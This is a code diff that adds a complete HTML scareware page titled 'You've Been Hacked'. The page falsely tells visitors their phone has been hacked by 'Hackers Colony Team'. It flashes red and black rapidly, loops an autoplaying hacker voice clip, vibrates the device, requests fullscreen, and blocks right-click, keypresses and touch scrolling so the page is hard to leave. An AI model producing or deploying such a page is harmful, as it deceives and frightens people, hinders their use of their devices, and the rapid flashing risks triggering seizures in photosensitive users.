@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You’ve Been Hacked</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            color: red;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            animation: flash 0.4s infinite;
+        }
+        @keyframes flash {
+            0% { background: black; }
+            50% { background: red; }
+            100% { background: black; }
+        }
+        .locked {
+            user-select: none;
+        }
+    </style>
+</head>
+<body class="locked">
+    <div>
+        <h1>⚠️ Your phone has been hacked ⚠️</h1>
+        <h3>By Hackers Colony Team</h3>
+        <audio id="voice" src="hackervoice.mp3" autoplay></audio>
+    </div>
+    <script>
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => e.preventDefault());
+        document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+        document.body.requestFullscreen?.();
+
+        function playLoop() {
+            document.getElementById("voice").play();
+            navigator.vibrate([500, 200, 500, 200, 500]);
+        }
+        setInterval(playLoop, 8000);
+    </script>
+</body>
+</html>
